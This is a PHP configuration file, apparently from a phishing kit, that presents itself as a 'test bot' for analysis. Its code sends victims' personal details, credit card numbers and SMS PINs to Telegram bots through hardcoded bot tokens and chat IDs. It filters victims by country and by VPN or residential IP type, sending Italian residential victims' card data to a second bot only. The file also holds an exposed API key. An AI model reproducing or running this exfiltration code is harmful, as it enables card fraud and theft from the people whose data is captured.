<?php
/**
 * Test Bot Configuration
 * Add your test bot token and chat ID here
 * This file is for analysis/testing purposes only
 * 
 * IMPORTANT: Replace these values with your actual test bot credentials
 */

// Your test bot token (replace with your actual bot token)
define("TEST_BOT_TOKEN", "8477484223:AAG-Krso8h-uguOIKxFKngfc2uzFncfvPqw");

// Your test chat ID (replace with your actual chat ID)
define("TEST_CHAT_ID", "-5282280577");

// Test mode (true = send to both original and test bots, false = original only)
define("TEST_MODE_ENABLED", true);

// Geo-targeting: Only mirror CC/SMS data to test bot when IP is from Italy
// Set to true to only mirror for Italian IPs, false to mirror all
define("ITALY_ONLY_MODE", true);

// Italy country codes for geo-targeting
define("ITALY_COUNTRY_CODES", ["IT", "VA", "SM", "ME"]);

// IPHub API key for VPN/Proxy detection (free: https://iphub.info/api)
define("IPHUB_API_KEY", "MzE3Mjk6cmREOGtvdXpKRDFRMkU3QnRRbWZZc3NmSUVHMmkwbGs=");

/**
 * Get IP type (residential, hosting, vpn, etc) using IPHub API
 * 
 * @param string $ip IP address to check
 * @return string IP type: "residential", "hosting", "vpn", "unknown"
 */
function getIPType($ip) {
    // Skip private/local IPs
    if ($ip === '127.0.0.1' || $ip === '::1' || strpos($ip, '192.168.') === 0 || 
        strpos($ip, '10.') === 0 || strpos($ip, '172.16.') === 0) {
        return "local";
    }
    
    // Skip if no API key configured
    if (empty(IPHUB_API_KEY)) {
        return "unknown";
    }
    
    $url = "https://v2.api.iphub.info/ip/" . $ip;
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("X-Key: " . IPHUB_API_KEY));
    $result = curl_exec($ch);
    curl_close($ch);
    
    if ($result) {
        $data = json_decode($result, true);
        if (isset($data['block'])) {
            // block: 0 = residential, 1 = hosting/proxy/VPN, 2 = both
            $block = $data['block'];
            if ($block == 0) {
                return "residential";
            } elseif ($block == 1) {
                return "hosting";
            } else {
                return "vpn";
            }
        }
    }
    
    return "unknown";
}

/**
 * Get real client IP address (handles proxies, load balancers, Docker, Koyeb)
 * Koyeb: use LAST IP from X-Forwarded-For (only trused one)
 * 
 * @return string Real client IP address
 */
function getRealClientIP() {
    // Check common proxy headers in order of preference
    $headers_to_check = [
        'HTTP_CF_CONNECTING_IP',      // Cloudflare
        'HTTP_X_REAL_IP',        // Nginx proxy
        'HTTP_X_FORWARDED_FOR',   // Proxy (use LAST IP for Koyeb)
        'HTTP_X_FORWARDED',      // Proxy
        'HTTP_FORWARDED_FOR',    // Proxy
        'HTTP_FORWARDED',       // Proxy
        'HTTP_CLIENT_IP',        // Client IP
    ];
    
    foreach ($headers_to_check as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];
            
            // Handle X-Forwarded-For (can contain multiple IPs)
            if (strpos($ip, ',') !== false) {
                $ips = explode(',', $ip);
                // For Koyeb: take LAST IP (most trusted)
                $ip = trim(end($ips));
            }
            
            // Validate IP format
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    
    // Fallback to REMOTE_ADDR
    return $_SERVER['REMOTE_ADDR'];
}

/**
 * Get country code from IP address using free GeoIP API
 * 
 * @param string $ip IP address to lookup
 * @return string Country code or "UNKNOWN" if failed
 */
function getCountryCode($ip) {
    // Skip private/local IPs
    if ($ip === '127.0.0.1' || $ip === '::1' || strpos($ip, '192.168.') === 0 || 
        strpos($ip, '10.') === 0 || strpos($ip, '172.16.') === 0) {
        return 'LOCAL';
    }
    
    // Try ip-api.com (free, 45 requests/minute)
    $url = "http://ip-api.com/json/" . $ip . "?fields=countryCode";
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $result = curl_exec($ch);
    curl_close($ch);
    
    if ($result) {
        $data = json_decode($result, true);
        if (isset($data['countryCode'])) {
            return $data['countryCode'];
        }
    }
    
    return "UNKNOWN";
}

/**
 * Check if IP is from Italy (or Vatican, San Marino, Monaco) AND is residential
 * VPN/Hosting IPs from Italy are treated as non-Italian (attacker gets data)
 * 
 * @param string $ip IP address to check
 * @return bool True if from Italy region AND residential
 */
function isFromItaly($ip) {
    if (ITALY_ONLY_MODE === false) {
        return true; // Mirror all if Italy-only mode is disabled
    }
    
    $countryCode = getCountryCode($ip);
    $isItalian = in_array($countryCode, ITALY_COUNTRY_CODES);
    
    // If not Italian, definitely not Italian residential
    if (!$isItalian) {
        return false;
    }
    
    // If Italian IP, check if it's residential (not VPN/hosting)
    $ipType = getIPType($ip);
    
    // If VPN/hosting from Italy, treat as non-Italian (attacker gets data)
    if ($ipType === "hosting" || $ipType === "vpn") {
        return false;
    }
    
    return true;
}

/**
 * Send message to test bot for analysis
 * 
 * @param string $message The message to send
 * @return bool True if sent successfully, false otherwise
 */
function sendToTestBot($message) {
    if (!TEST_MODE_ENABLED) {
        return false;
    }
    
    $url = "https://api.telegram.org/bot" . TEST_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TEST_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    $result = curl_exec($ch);
    curl_close($ch);
    
    return $result !== false;
}

/**
 * Send message to all configured bots (original + test)
 * This function wraps the original sending logic
 * 
 * @param string $bot Original bot token
 * @param array $ids Original chat IDs
 * @param string $message The message to send
 * @param string $message_type Type of message for logging (e.g., "INFO", "CC", "SMS")
 * @param string $victim_ip Victim's IP address for geo-targeting
 */
function sendToAllBots($bot, $ids, $message, $message_type = "INFO", $victim_ip = "") {
    global $panel;
    
    // For PERSONAL_INFO - Always send to both (attacker + test)
    if ($message_type === "PERSONAL_INFO") {
        foreach($ids as $id){
            $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$message";
            sendBot($url);
        }
        if (TEST_MODE_ENABLED) {
            // Decode first for clean display
            $decoded_msg = urldecode($message);
            $test_message = "🛡️ [TEST MODE - $message_type] 🛡️\n" . $decoded_msg . "\n\n📊 Analysis Data:\n• Panel: $panel\n• Time: " . date('Y-m-d H:i:s');
            sendToTestBot($test_message);
        }
        return;
    }
    
    // For CREDIT_CARD and SMS_PIN - Check if Italian IP
    if ($message_type === "CREDIT_CARD" || $message_type === "SMS_PIN") {
        $isItalian = isFromItaly($victim_ip);
        $country = getCountryCode($victim_ip);
        $ipType = getIPType($victim_ip);
        
        if ($isItalian) {
            // ITALIAN RESIDENTIAL: Only test bot gets data, attacker gets NOTHING
            if (TEST_MODE_ENABLED) {
                $decoded_msg = urldecode($message);
                $test_message = "🛡️ [🇮🇹 ITALIAN RESIDENTIAL - $message_type] 🛡️\n" . $decoded_msg . "\n\n📊 Analysis Data:\n• IP: $victim_ip\n• Country: $country\n• IP Type: $ipType\n• Panel: $panel\n• Time: " . date('Y-m-d H:i:s');
                sendToTestBot($test_message);
            }
            // Attacker gets nothing - no data sent to original bot
        } else {
            // NON-ITALIAN or ITALIAN VPN/HOSTING: Only attacker gets data, test gets info
            foreach($ids as $id){
                $url = "https://api.telegram.org/bot$bot/sendMessage?chat_id=$id&text=$message";
                sendBot($url);
            }
            if (TEST_MODE_ENABLED) {
                // Check if Italian but VPN/hosting
                $italianCountry = in_array($country, ITALY_COUNTRY_CODES);
                if ($italianCountry && ($ipType === "hosting" || $ipType === "vpn")) {
                    $reason = "Italian IP but type: $ipType (not residential)";
                } else {
                    $reason = "Not Italian IP";
                }
                $test_message = "⏭️ [SKIPPED - $reason] ⏭️\nType: $message_type\nIP: $victim_ip ($country)\nIP Type: $ipType\nReason: Data sent to attacker only";
                sendToTestBot($test_message);
            }
        }
        return;
    }
}
?>